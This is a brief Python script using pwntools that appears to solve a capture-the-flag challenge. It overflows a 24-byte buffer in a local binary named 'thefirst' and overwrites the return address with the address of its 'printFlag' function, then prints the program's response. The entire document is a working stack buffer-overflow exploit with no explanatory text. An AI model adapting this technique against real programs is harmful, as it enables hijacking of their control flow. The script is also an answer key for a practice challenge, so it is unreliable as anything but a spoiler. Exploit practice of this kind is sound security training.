from pwn import *

buffer_length = 24

elf = ELF('./thefirst')
payload = 'a' * buffer_length + p32(elf.symbols['printFlag'])
app = process('./thefirst')

app.sendlineafter("> ", payload)
print(app.recv())